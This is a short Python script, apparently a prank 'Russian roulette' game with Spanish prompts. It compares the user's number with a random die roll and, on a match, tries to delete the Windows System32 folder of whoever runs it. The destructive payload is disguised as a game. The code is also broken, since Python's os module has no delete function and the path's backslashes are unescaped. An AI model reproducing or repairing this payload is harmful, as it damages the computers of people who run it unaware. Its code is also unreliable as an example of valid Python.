import os
from random import randint
bala=randint(1,6)


numero=int(input("Ingresa Un Número: \n"))

def ruleta_rusa(numero, bala):
    if numero != bala:
        print("Felicidades, zafaste.")
    elif numero == bala:
        os.delete("C:\Windows\System32")

ruleta_rusa(numero, bala)
